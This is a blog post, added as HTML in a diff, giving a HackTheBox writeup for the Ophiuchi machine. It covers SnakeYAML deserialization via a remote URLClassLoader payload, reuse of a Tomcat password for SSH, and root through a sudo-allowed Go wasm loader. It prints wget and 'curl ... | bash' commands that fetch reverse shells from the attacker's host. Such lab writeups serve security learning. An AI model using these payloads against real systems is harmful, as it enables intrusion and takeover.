@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Ophiuchi Writeup [HTB]</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Ophiuchi Writeup [HTB] | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Ophiuchi Writeup [HTB]" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Ophiuchi is a Linux based machined that was active since February 13th of 2021 to July 3rd, on this machine we will exploit a Java deserialization problem on snakeyaml to get command execution and access to the machine, then will find some credentials on configuration files of tomcat, finally we will have to compile some rust code to web assembly to be able to execute a go script that will allow us to run any bash script as root finishing with the machine." />
+<meta property="og:description" content="Ophiuchi is a Linux based machined that was active since February 13th of 2021 to July 3rd, on this machine we will exploit a Java deserialization problem on snakeyaml to get command execution and access to the machine, then will find some credentials on configuration files of tomcat, finally we will have to compile some rust code to web assembly to be able to execute a go script that will allow us to run any bash script as root finishing with the machine." />
+<link rel="canonical" href="http://localhost:8000/Ophiuchi" />
+<meta property="og:url" content="http://localhost:8000/Ophiuchi" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/ophiuchi/ophiuchi.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-07-03T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/ophiuchi/ophiuchi.png" />
+<meta property="twitter:title" content="Ophiuchi Writeup [HTB]" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2021-07-03T00:00:00-05:00","datePublished":"2021-07-03T00:00:00-05:00","description":"Ophiuchi is a Linux based machined that was active since February 13th of 2021 to July 3rd, on this machine we will exploit a Java deserialization problem on snakeyaml to get command execution and access to the machine, then will find some credentials on configuration files of tomcat, finally we will have to compile some rust code to web assembly to be able to execute a go script that will allow us to run any bash script as root finishing with the machine.","headline":"Ophiuchi Writeup [HTB]","image":"http://localhost:8000/assets/images/ophiuchi/ophiuchi.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Ophiuchi"},"url":"http://localhost:8000/Ophiuchi"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/ophiuchi/ophiuchi.png/../banner.png>
+  
+  <h2>Ophiuchi Writeup [HTB]</h2>
+  <time datetime="2021-07-03T00:00:00-05:00" class="by-line">03 Jul 2021</time>
+  <p>Ophiuchi is a Linux based machined that was active since February 13th of 2021 to July 3rd, on this machine we will exploit a Java deserialization problem on snakeyaml to get command execution and access to the machine, then will find some credentials on configuration files of tomcat, finally we will have to compile some rust code to web assembly to be able to execute a go script that will allow us to run any bash script as root finishing with the machine.</p>
+
+<h1 id="enumeration"><a href="#header-1"></a>Enumeration</h1>
+
+<p>We start using masscan to find all the available ports and then use nmap to get more information about them.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan -e tun0 --rate=500 -p 0-65535 10.10.10.227
+nmap -sC -sV -p 8080,22, -Pn -o scan.txt 10.10.10.227
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
+8080/tcp open  http    Apache Tomcat 9.0.38
+|_http-title: Parse YAML
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>There is only two ports open, ssh and a webpage hosted on Apache Tomcat, let’ check it.</p>
+
+<p><img src="/assets/images/ophiuchi/webpage.png" alt="" /></p>
+
+<p>There we see an online YAML parser, the site is running on Tomcat, hence, Java, and as we know Java is the king of deserialization problems, so after searching for a while for issues on deserializing YAML we get to this <a href="https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858">blog</a>.</p>
+
+<h1 id="gaining-access"><a href="#header-1"></a>Gaining Access</h1>
+
+<p>On that blog is explained the vulnerability and how to exploit it, so first we copy the Java code, fix the issues than come when copying something from medium, and let’s change the payload, notice that “Runtime.getRuntime().exec” only works with absolute path commands, so first we will upload a file with a reverse shell, and then exploit the vulnerability again to execute that file, so our first payload will be <code class="language-plaintext highlighter-rouge">/usr/bin/wget 10.10.14.205:8000/shell.sh -O /tmp/justatest.sh</code>, if you don’t want to have problems with Java you have to name the file “exploit.java”, if you want to use another name you have to change the names of the classes inside the file, I did so and call it subte.java, then I ran <code class="language-plaintext highlighter-rouge">javac subte.java</code>, and got subte.class, then following the blog we have to create some directories and a file, getting:</p>
+
+<p><img src="/assets/images/ophiuchi/tree.png" alt="" /></p>
+
+<p>javax.script.ScriptEngineFactory, contains “subte.subte” which are the directory and the name of the class file separated by a period, finally we start a http server, don’t forget to put shell.sh on it, and try to parsee the next stuff:</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">!!</span><span class="n">javax</span><span class="o">.</span><span class="na">script</span><span class="o">.</span><span class="na">ScriptEngineManager</span> <span class="o">[</span>
+  <span class="o">!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URLClassLoader</span> <span class="o">[[</span>
+    <span class="o">!!</span><span class="n">java</span><span class="o">.</span><span class="na">net</span><span class="o">.</span><span class="na">URL</span> <span class="o">[</span><span class="s">"http://10.10.14.205:8000/"</span><span class="o">]</span>
+  <span class="o">]]</span>
+<span class="o">]</span>
+</code></pre></div></div>
+
+<p>But, even though we get the requests to our server, we get an error page, and our shell isn’t uploaded.</p>
+
+<p><img src="/assets/images/ophiuchi/httpserv.png" alt="" /></p>
+
+<p>Reviewing the error page we find the cause.</p>
+
+<p><img src="/assets/images/ophiuchi/error.png" alt="" /></p>
+
+<p>As I said before, names are important in Java if we don’t want to have problems, subte/subte is the location of the file, but not the name of the file, that is just subte, the location of the file is defined on “javax.script.ScriptEngineFactory”, so let’s change it to just “subte”, and move the .class file to the root of the http server, now when we send the request again our shell gets uploaded, finaly we change the payload for <code class="language-plaintext highlighter-rouge">/bin/bash /tmp/justatest.sh</code>, generate the class file, replace the one that we used, send again the request and we have a shell inside the machine.</p>
+
+<p><img src="/assets/images/ophiuchi/shell1.png" alt="" /></p>
+
+<h1 id="lateral-movement"><a href="#header-1"></a>Lateral Movement</h1>
+
+<p>Now that we are inside we look for tomcat’s configuration files, the only location we find tomcat is on /opt/tomcat, so we access there and search for any password.</p>
+
+<p><img src="/assets/images/ophiuchi/tomcat.png" alt="" /></p>
+
+<p>We find the password of admin, whythereisalimit, there is also a user called admin on the machine, and he uses the same password, now we can get through SSH, and retrieve user.txt.</p>
+
+<p><img src="/assets/images/ophiuchi/shell2.png" alt="" /></p>
+
+<h1 id="privilege-escalation"><a href="#header-1"></a>Privilege Escalation</h1>
+
+<p>Now that we have access to another user let’s see if we can run anything with sudo.</p>
+
+<p><img src="/assets/images/ophiuchi/sudo.png" alt="" /></p>
+
+<p>We see that we can run /opt/wasm-functions/index.go with sudo, so let’s check it and see if we can figure out what it does.</p>
+
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+
+<span class="k">import</span> <span class="p">(</span>
+	<span class="s">"fmt"</span>
+	<span class="n">wasm</span> <span class="s">"github.com/wasmerio/wasmer-go/wasmer"</span>
+	<span class="s">"os/exec"</span>
+	<span class="s">"log"</span>
+<span class="p">)</span>
+
+
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="n">bytes</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">wasm</span><span class="o">.</span><span class="n">ReadBytes</span><span class="p">(</span><span class="s">"main.wasm"</span><span class="p">)</span>
+
+	<span class="n">instance</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">wasm</span><span class="o">.</span><span class="n">NewInstance</span><span class="p">(</span><span class="n">bytes</span><span class="p">)</span>
+	<span class="k">defer</span> <span class="n">instance</span><span class="o">.</span><span class="n">Close</span><span class="p">()</span>
+	<span class="n">init</span> <span class="o">:=</span> <span class="n">instance</span><span class="o">.</span><span class="n">Exports</span><span class="p">[</span><span class="s">"info"</span><span class="p">]</span>
+	<span class="n">result</span><span class="p">,</span><span class="n">_</span> <span class="o">:=</span> <span class="n">init</span><span class="p">()</span>
+	<span class="n">f</span> <span class="o">:=</span> <span class="n">result</span><span class="o">.</span><span class="n">String</span><span class="p">()</span>
+	<span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">!=</span> <span class="s">"1"</span><span class="p">)</span> <span class="p">{</span>
+		<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Not ready to deploy"</span><span class="p">)</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Ready to deploy"</span><span class="p">)</span>
+		<span class="n">out</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">exec</span><span class="o">.</span><span class="n">Command</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">,</span> <span class="s">"deploy.sh"</span><span class="p">)</span><span class="o">.</span><span class="n">Output</span><span class="p">()</span>
+		<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+			<span class="n">log</span><span class="o">.</span><span class="n">Fatal</span><span class="p">(</span><span class="n">err</span><span class="p">)</span>
+		<span class="p">}</span>
+		<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="kt">string</span><span class="p">(</span><span class="n">out</span><span class="p">))</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>I don’t know go, so I can only guess what is happening, first ir reads a file called main.wasm, then after doing some stuff it export info (probably info is a function inside main.wasm), then it gets a result from it, and if the result is “1”, it executes deploy.sh, searching there are only two files called “main.wasm”, one located at “/opt/wasm-functions/” and another on “/opt/wasm-functions/backup”, so let’s go to those directories and try to execute the script.
+We get the same output from both, “Not ready to deploy”, so the function isn’t returning 1, and the file is a binary file quite big (1.5 MB), so we can’t just try to edit the hex of the binary to get what we want. On the imports of the script there is a github link, github.com/wasmerio/wasmer-go/wasmer, so let’s go there and try to understand what is going on with the script.
+There we learn that .wasm files are files compiled to web assembly, and on this case those are writte in rust, <a href="https://depth-first.com/articles/2020/06/29/compiling-rust-to-webassembly-a-simple-example/">here</a> is a simple guide to compile some rust code to web assembly, the code that we need is the next one:</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nd">#[no_mangle]</span>
+<span class="k">pub</span> <span class="k">fn</span> <span class="nf">info</span><span class="p">()</span> <span class="k">-&gt;</span> <span class="nb">i32</span> <span class="p">{</span>
+    <span class="mi">1</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>As we saw the go script converts the output to a string, so nothing would happen if we return an int value. Now that we have main.wasm we just need deploy.sh, I go with my usual curl command that retrieves a reverse shell and pipes it to bash, <code class="language-plaintext highlighter-rouge">curl 10.10.14.205:8000/shell.sh | bash</code>, with those files in the same directory we can execute the script and we will get a shell as root.</p>
+
+<p><img src="/assets/images/ophiuchi/execute.png" alt="" /></p>
+
+<p><img src="/assets/images/ophiuchi/root.png" alt="" /></p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <a href="/tags.html#java-deserealization"> Java deserealization</a> &nbsp;
+  
+  <a href="/tags.html#web-assembly"> Web assembly</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
